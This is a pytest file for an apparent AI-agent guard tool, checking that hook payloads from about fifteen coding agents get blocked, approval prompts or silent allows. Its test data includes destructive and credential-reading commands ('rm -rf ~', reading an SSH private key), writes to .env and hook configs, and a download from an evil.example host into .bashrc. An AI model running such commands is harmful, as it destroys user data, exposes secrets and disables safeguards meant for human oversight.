"""Per-agent profiles: every supported agent's real hook payload shape goes through the same policy
and gets an answer in that agent's own reply format. Payload shapes come from each agent's source or
hook reference (see docs/agents.md). The three scenarios per agent:

- dangerous (`rm -rf ~`): always blocked;
- needs approval (`git push`): an approval prompt where the agent supports one, a block otherwise;
- harmless (read README.md): no output, so the agent's own permission checks still apply.
"""

import io
import json
import sqlite3

import pytest

from agent_ledger.adapters.agents import PROFILES
from agent_ledger.hook import main as hook_main

SECRET_CMD = "cat ~/.ssh/id_rsa"


def shell(agent, cmd, cwd):
    """A pre-tool shell call in each agent's own payload shape."""
    return {
        "codex": {"hook_event_name": "PreToolUse", "session_id": "s1", "cwd": cwd, "tool_name": "Bash",
                  "tool_input": {"command": cmd}, "tool_use_id": "t1", "turn_id": "u", "model": "gpt"},
        "copilot": {"sessionId": "s1", "timestamp": 1, "cwd": cwd, "toolName": "bash",
                    "toolArgs": json.dumps({"command": cmd})},
        "cursor": {"conversation_id": "s1", "generation_id": "g", "hook_event_name": "preToolUse",
                   "workspace_roots": [cwd], "tool_name": "Shell",
                   "tool_input": {"command": cmd, "working_directory": cwd}, "tool_use_id": "t1", "cwd": cwd},
        "gemini": {"session_id": "s1", "cwd": cwd, "hook_event_name": "BeforeTool", "tool_name": "run_shell_command",
                   "tool_input": {"command": cmd, "dir_path": cwd}},
        "antigravity": {"toolCall": {"name": "run_command", "args": {"CommandLine": cmd, "Cwd": cwd}},
                        "conversationId": "s1", "workspacePaths": [cwd], "stepIdx": 3},
        "cline": {"clineVersion": "3.0.74", "hookName": "tool_call", "taskId": "s1", "workspaceRoots": [cwd],
                  "tool_call": {"id": "t1", "name": "run_commands", "input": {"commands": [cmd]}}},
        "windsurf": {"agent_action_name": "pre_run_command", "trajectory_id": "s1", "execution_id": "e1",
                     "tool_info": {"command_line": cmd, "cwd": cwd}},
        "goose": {"event": "PreToolUse", "session_id": "s1", "tool_name": "shell", "tool_input": {"command": cmd},
                  "working_dir": cwd, "tool_call_id": "t1"},
        "crush": {"event": "PreToolUse", "hook_event_name": "PreToolUse", "session_id": "s1", "cwd": cwd,
                  "tool_name": "bash", "tool_input": {"command": cmd, "working_dir": cwd}, "tool_use_id": "t1"},
        "qwen": {"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "run_shell_command",
                 "tool_input": {"command": cmd, "directory": cwd}, "tool_use_id": "t1"},
        "continue": {"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "Bash",
                     "tool_input": {"command": cmd}, "tool_use_id": "t1"},
        "factory": {"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "Execute",
                    "tool_input": {"command": cmd}, "permission_mode": "default"},
        "kiro": {"hook_event_name": "PreToolUse", "cwd": cwd, "session_id": "s1", "tool_name": "execute_bash",
                 "tool_input": {"command": cmd}},
        "auggie": {"hook_event_name": "PreToolUse", "conversation_id": "s1", "workspace_roots": [cwd],
                   "tool_name": "launch-process", "tool_input": {"command": cmd}, "is_mcp_tool": False},
        "devin": {"hook_event_name": "PreToolUse", "session_id": "s1", "tool_name": "exec",
                  "tool_input": {"command": cmd}, "cwd": cwd},
    }[agent]


def read(agent, path, cwd):
    return {
        "codex": None,  # Codex has no read tool: reads are shell commands
        "copilot": {"sessionId": "s1", "cwd": cwd, "toolName": "view", "toolArgs": json.dumps({"path": path})},
        "cursor": {"conversation_id": "s1", "hook_event_name": "preToolUse", "workspace_roots": [cwd],
                   "tool_name": "Read", "tool_input": {"file_path": path}, "cwd": cwd},
        "gemini": {"session_id": "s1", "cwd": cwd, "hook_event_name": "BeforeTool", "tool_name": "read_file",
                   "tool_input": {"file_path": path}},
        "antigravity": {"toolCall": {"name": "view_file", "args": {"AbsolutePath": path}}, "conversationId": "s1",
                        "workspacePaths": [cwd]},
        "cline": {"hookName": "tool_call", "taskId": "s1", "workspaceRoots": [cwd],
                  "tool_call": {"id": "t", "name": "read_files", "input": {"files": [{"path": path}]}}},
        "windsurf": {"agent_action_name": "pre_read_code", "trajectory_id": "s1", "tool_info": {"file_path": path}},
        "goose": None,  # Goose reads through its shell tool
        "crush": {"hook_event_name": "PreToolUse", "session_id": "s1", "cwd": cwd, "tool_name": "view",
                  "tool_input": {"file_path": path}},
        "qwen": {"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "read_file",
                 "tool_input": {"file_path": path}},
        "continue": {"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "Read",
                     "tool_input": {"filepath": path}},
        "factory": {"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "Read",
                    "tool_input": {"file_path": path}},
        "kiro": {"hook_event_name": "PreToolUse", "cwd": cwd, "tool_name": "fs_read",
                 "tool_input": {"operations": [{"mode": "Line", "path": path}]}},
        "auggie": {"hook_event_name": "PreToolUse", "conversation_id": "s1", "workspace_roots": [cwd],
                   "tool_name": "view", "tool_input": {"path": path}},
        "devin": {"hook_event_name": "PreToolUse", "session_id": "s1", "tool_name": "read",
                  "tool_input": {"file_path": path}, "cwd": cwd},
    }[agent]


AGENTS = sorted(PROFILES)


@pytest.fixture(autouse=True)
def _in_project(project, monkeypatch):
    monkeypatch.chdir(project)  # hooks run in the workspace; some payloads (Windsurf reads) carry no cwd


def run(agent, data, ledger_home, event=None):
    out, err = io.StringIO(), io.StringIO()
    code = hook_main(io.StringIO(json.dumps(data)), out, err, {"AGENT_LEDGER_HOME": str(ledger_home), "HOME": "/nonexistent-home"},
                     agent=agent, event=event)
    return code, out.getvalue(), err.getvalue()


def verdict(agent, code, out, err):
    """What the agent will do with this reply: allow (no opinion), ask, or deny."""
    p = PROFILES[agent]
    if code == 2:
        return "deny"
    if not out:
        return "allow"
    obj = json.loads(out)
    if p.style == "claude":
        return obj["hookSpecificOutput"]["permissionDecision"]
    if p.style == "copilot":
        return obj["permissionDecision"]
    if p.style in ("gemini", "devin"):
        return {"block": "deny", "approve": "allow"}.get(obj["decision"], obj["decision"])
    if p.style == "cursor":
        return obj["permission"]
    if p.style == "cline":
        return "deny" if obj.get("cancel") else "allow"
    raise AssertionError(p.style)


def test_every_agent_in_the_research_has_a_profile():
    assert set(AGENTS) == {"codex", "copilot", "cursor", "gemini", "antigravity", "cline", "windsurf", "goose",
                           "crush", "qwen", "continue", "factory", "kiro", "auggie", "devin"}


@pytest.mark.parametrize("agent", AGENTS)
def test_dangerous_command_is_blocked(agent, ledger_home, project):
    code, out, err = run(agent, shell(agent, "rm -rf ~", str(project)), ledger_home)
    assert verdict(agent, code, out, err) == "deny"
    assert "agent-ledger" in (out + err)


@pytest.mark.parametrize("agent", AGENTS)
def test_secret_read_by_shell_is_blocked(agent, ledger_home, project):
    code, out, err = run(agent, shell(agent, SECRET_CMD, str(project)), ledger_home)
    assert verdict(agent, code, out, err) == "deny"


@pytest.mark.parametrize("agent", AGENTS)
def test_needs_approval_never_silently_allowed(agent, ledger_home, project):
    code, out, err = run(agent, shell(agent, "git push origin main", str(project)), ledger_home)
    v = verdict(agent, code, out, err)
    if PROFILES[agent].ask:
        assert v == "ask"
    else:
        assert v == "deny" and "needs human approval" in (out + err)


@pytest.mark.parametrize("agent", AGENTS)
def test_harmless_shell_writes_nothing(agent, ledger_home, project):
    assert run(agent, shell(agent, "ls -la", str(project)), ledger_home) == (0, "", "")


@pytest.mark.parametrize("agent", [a for a in AGENTS if read(a, "x", "/") is not None])
def test_reads_inside_project_allowed_and_secret_files_blocked(agent, ledger_home, project):
    (project / "README.md").write_text("hi")
    ok = run(agent, read(agent, str(project / "README.md"), str(project)), ledger_home)
    assert verdict(agent, *ok) == "allow"
    bad = run(agent, read(agent, str(project / ".env"), str(project)), ledger_home)
    assert verdict(agent, *bad) == "deny"


@pytest.mark.parametrize("agent", AGENTS)
def test_calls_are_recorded_under_the_agents_name_with_canonical_tools(agent, ledger_home, project):
    run(agent, shell(agent, "ls", str(project)), ledger_home)
    db = sqlite3.connect(ledger_home / "ledger.db")
    rows = db.execute("SELECT agent, event_type, tool_name, decision, session_id FROM events").fetchall()
    db.close()
    assert rows == [(agent, "PreToolUse", "Bash", "allow", "s1")]


@pytest.mark.parametrize("agent", AGENTS)
def test_garbage_input_never_breaks_the_agent(agent, ledger_home):
    out, err = io.StringIO(), io.StringIO()
    code = hook_main(io.StringIO("{not json"), out, err, {"AGENT_LEDGER_HOME": str(ledger_home)}, agent=agent)
    assert code == 0 and out.getvalue() == ""


# ---------------------------------------------------------------- agent-specific shapes

def test_codex_apply_patch_paths_are_checked(ledger_home, project):
    patch = "*** Begin Patch\n*** Add File: .env\n+X=1\n*** End Patch"
    data = {**shell("codex", "", str(project)), "tool_name": "apply_patch", "tool_input": {"command": patch}}
    assert verdict("codex", *run("codex", data, ledger_home)) == "deny"


def test_codex_never_gets_a_bare_allow_or_ask(ledger_home, project):
    # Codex rejects permissionDecision "allow" without updatedInput, and "ask" entirely
    _, out, _ = run("codex", shell("codex", "git push", str(project)), ledger_home)
    assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_copilot_post_event_records_result(ledger_home, project):
    data = {"sessionId": "s1", "cwd": str(project), "toolName": "bash", "toolArgs": '{"command": "ls"}',
            "toolResult": {"resultType": "success", "textResultForLlm": "README.md"}}
    assert run("copilot", data, ledger_home, event="post") == (0, "", "")
    db = sqlite3.connect(ledger_home / "ledger.db")
    assert db.execute("SELECT event_type, tool_name FROM events").fetchall() == [("PostToolUse", "Bash")]
    db.close()


def test_copilot_pascal_case_events_use_claude_fields(ledger_home, project):
    data = {"hook_event_name": "PreToolUse", "session_id": "s1", "cwd": str(project), "tool_name": "Bash",
            "tool_input": {"command": "rm -rf ~"}}
    assert verdict("copilot", *run("copilot", data, ledger_home)) == "deny"


def test_cursor_mcp_tools_need_approval(ledger_home, project):
    data = {"conversation_id": "s1", "hook_event_name": "preToolUse", "workspace_roots": [str(project)],
            "tool_name": "MCP:create_issue", "tool_input": {"title": "x"}}
    assert verdict("cursor", *run("cursor", data, ledger_home)) == "deny"  # ask -> block (not enforced by Cursor)


def test_cursor_delete_outside_project_blocked(ledger_home, project, tmp_path):
    data = {"conversation_id": "s1", "hook_event_name": "preToolUse", "workspace_roots": [str(project)],
            "tool_name": "Delete", "tool_input": {"file_path": str(tmp_path / "home-file")}}
    assert verdict("cursor", *run("cursor", data, ledger_home)) == "deny"


def test_gemini_web_fetch_urls_come_from_the_prompt(ledger_home, project):
    data = {"session_id": "s1", "cwd": str(project), "hook_event_name": "BeforeTool", "tool_name": "web_fetch",
            "tool_input": {"prompt": "Summarise https://docs.python.org/3/ and https://evil.example/x"}}
    assert verdict("gemini", *run("gemini", data, ledger_home)) == "ask"  # one URL is not on the allowlist


def test_gemini_read_many_files_checks_every_path(ledger_home, project):
    data = {"session_id": "s1", "cwd": str(project), "hook_event_name": "BeforeTool", "tool_name": "read_many_files",
            "tool_input": {"include": ["README.md", ".env"]}}
    assert verdict("gemini", *run("gemini", data, ledger_home)) == "deny"


def test_gemini_mcp_names_are_treated_as_mcp(ledger_home, project):
    data = {"session_id": "s1", "cwd": str(project), "hook_event_name": "BeforeTool", "tool_name": "mcp_github_create_issue",
            "tool_input": {}, "mcp_context": {"server_name": "github", "tool_name": "create_issue"}}
    assert verdict("gemini", *run("gemini", data, ledger_home)) == "ask"


def test_antigravity_write_to_hook_config_is_denied(ledger_home, project):
    data = {"toolCall": {"name": "write_to_file", "args": {"TargetFile": str(project / ".agents" / "hooks.json"),
                                                           "CodeContent": "{}"}},
            "conversationId": "s1", "workspacePaths": [str(project)]}
    assert verdict("antigravity", *run("antigravity", data, ledger_home)) == "deny"


def test_cline_vscode_shape_with_string_parameters(ledger_home, project):
    data = {"clineVersion": "4.1.26", "hookName": "PreToolUse", "taskId": "s1", "workspaceRoots": [str(project)],
            "preToolUse": {"toolName": "run_commands", "parameters": {"commands": '["rm -rf ~"]'}}}
    assert verdict("cline", *run("cline", data, ledger_home)) == "deny"


def test_cline_editor_creates_and_edits(ledger_home, project):
    for inp in ({"path": str(project / ".env"), "new_text": "X=1"},
                {"path": str(project / ".env"), "old_text": "a", "new_text": "b"}):
        data = {"hookName": "tool_call", "taskId": "s1", "workspaceRoots": [str(project)],
                "tool_call": {"id": "t", "name": "editor", "input": inp}}
        assert verdict("cline", *run("cline", data, ledger_home)) == "deny"


def test_cline_command_objects_with_args(ledger_home, project):
    data = {"hookName": "tool_call", "taskId": "s1", "workspaceRoots": [str(project)],
            "tool_call": {"id": "t", "name": "run_commands",
                          "input": {"commands": [{"command": "rm", "args": ["-rf", "~"]}]}}}
    assert verdict("cline", *run("cline", data, ledger_home)) == "deny"


def test_windsurf_write_and_mcp(ledger_home, project):
    w = {"agent_action_name": "pre_write_code", "trajectory_id": "s1",
         "tool_info": {"file_path": str(project / ".devin" / "hooks.json"), "edits": []}}
    assert verdict("windsurf", *run("windsurf", w, ledger_home)) == "deny"
    m = {"agent_action_name": "pre_mcp_tool_use", "trajectory_id": "s1",
         "tool_info": {"mcp_server_name": "gh", "mcp_tool_name": "x", "mcp_tool_arguments": {}}}
    assert verdict("windsurf", *run("windsurf", m, ledger_home)) == "deny"


def test_windsurf_post_events_are_recorded_not_answered(ledger_home, project):
    data = {"agent_action_name": "post_run_command", "trajectory_id": "s1",
            "tool_info": {"command_line": "ls", "cwd": str(project)}}
    assert run("windsurf", data, ledger_home) == (0, "", "")


def test_goose_edit_fields(ledger_home, project):
    data = {"event": "PreToolUse", "session_id": "s1", "tool_name": "edit", "working_dir": str(project),
            "tool_input": {"path": str(project / ".env"), "before": "a", "after": "b"}}
    assert verdict("goose", *run("goose", data, ledger_home)) == "deny"


def test_kiro_delete_file_outside_project_is_a_delete(ledger_home, project, tmp_path):
    data = {"hook_event_name": "PreToolUse", "cwd": str(project), "tool_name": "delete_file",
            "tool_input": {"path": str(tmp_path)}}
    assert verdict("kiro", *run("kiro", data, ledger_home)) == "deny"


def test_crush_download_checks_host_and_target(ledger_home, project):
    data = {"hook_event_name": "PreToolUse", "session_id": "s1", "cwd": str(project), "tool_name": "download",
            "tool_input": {"url": "https://evil.example/x.sh", "file_path": str(project / ".bashrc")}}
    assert verdict("crush", *run("crush", data, ledger_home)) in ("deny",)


def test_auggie_mcp_flag(ledger_home, project):
    data = {"hook_event_name": "PreToolUse", "conversation_id": "s1", "workspace_roots": [str(project)],
            "tool_name": "create_issue_github", "tool_input": {}, "is_mcp_tool": True}
    assert verdict("auggie", *run("auggie", data, ledger_home)) == "deny"  # ask -> block (deny-only agent)


def test_qwen_tool_call_bridge_is_checked_as_the_inner_tool(ledger_home, project):
    data = {**shell("qwen", "", str(project)), "tool_name": "tool_call",
            "tool_input": {"name": "run_shell_command", "args": {"command": "rm -rf ~"}}}
    assert verdict("qwen", *run("qwen", data, ledger_home)) == "deny"
    data["tool_input"] = {"name": "read_file", "args": {"file_path": str(project / "README.md")}}
    assert verdict("qwen", *run("qwen", data, ledger_home)) == "allow"
